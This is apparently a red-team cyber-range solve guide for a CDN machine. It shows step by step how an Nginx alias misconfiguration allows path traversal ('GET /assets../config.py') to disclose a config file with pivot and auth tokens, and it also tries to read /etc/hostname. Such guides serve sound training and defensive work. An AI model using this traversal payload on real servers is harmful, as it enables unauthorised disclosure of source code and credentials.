# Red Team Solve Guide — M5
## RNG-EXT-01 | M5-ext-cdn-server | Nginx Alias Path Traversal → Source Disclosure
**Technique:** T1083 — File and Directory Discovery  
**Pivot In:** Reachable from any prior machine (no credential required)  
**Pivot Out:** `vs-corp-7g9h2j4k6n2m` + CORP zone entry description

> **Note:** M5 can be approached at any time during the range — it is a standalone CDN server with no auth dependency. The pivot token extracted here overlaps with M4's XXE result. In a real attack scenario the red teamer would find this independently.

---

## Objective
The Nginx CDN server has an `alias` misconfiguration — the `location /assets` block is missing a trailing slash, enabling path traversal from `/assets` to the parent directory containing `config.py`.

---

## Step 1 — Enumerate the Server

```bash
curl -s http://203.x.x.x:80/ | grep -i "bunl\|cdn\|version"
# BUNL CDN Static File Server v1.3.0

# Health check
curl -s http://203.x.x.x:80/cdn-api/health
# {"status":"ok","service":"BUNL CDN Static Server","version":"1.3.0"}

# CDN management requires auth
curl -s http://203.x.x.x:80/cdn-api/purge
# {"error":"Authentication required","realm":"BUNL CDN Management"}
```

---

## Step 2 — Discover Static Assets

```bash
curl -s http://203.x.x.x:80/assets/bunl-core.css | head -3
# /* BUNL Corporate Stylesheet v2.1 */
```

Assets are served. Now probe the Nginx alias directive:

---

## Step 3 — Exploit Nginx Off-By-One Alias Traversal

The Nginx config:
```nginx
location /assets {
    alias /opt/bunl/cdn-server/assets/;
}
```
Without a trailing slash on `location /assets`, Nginx matches the prefix and appends the remainder literally. The request `/assets../config.py` becomes:
- Location prefix matched: `/assets`
- Remainder: `../config.py`
- Alias root: `/opt/bunl/cdn-server/assets/`
- Final path: `/opt/bunl/cdn-server/assets/../config.py` = `/opt/bunl/cdn-server/config.py`

```bash
curl -s "http://203.x.x.x:80/assets../config.py"
```

Response — full Python config file:
```python
# BUNL CDN Server — Application Configuration
...
CORP_PIVOT_TOKEN = "vs-corp-7g9h2j4k6n2m"
CORP_ZONE_ENTRY = "BUNL HR System — DISHA (Corporate Zone, M1)"
CDN_AUTH_TOKEN = "cdn-a4f2e8b1c3d7f9a0"
```

---

## Step 4 — Enumerate Further

```bash
# Try other files in the parent directory
curl -s "http://203.x.x.x:80/assets../webroot/index.html" | head -5
# Confirms the root structure

# Try traversing further
curl -s "http://203.x.x.x:80/assets../../etc/hostname"
# Nginx alias only resolves one level — deeper traversal blocked by Nginx's uri normalisation
```

---

## Summary

| Item | Value |
|---|---|
| Vulnerability | Nginx alias off-by-one path traversal (CWE-22) |
| Payload | `GET /assets../config.py` |
| File Disclosed | `/opt/bunl/cdn-server/config.py` |
| Credential Obtained | `CORP_PIVOT_TOKEN = vs-corp-7g9h2j4k6n2m` |
| Next Zone | RNG-CORP-01 M1 — BUNL HR System DISHA |
| MITRE | T1083 |
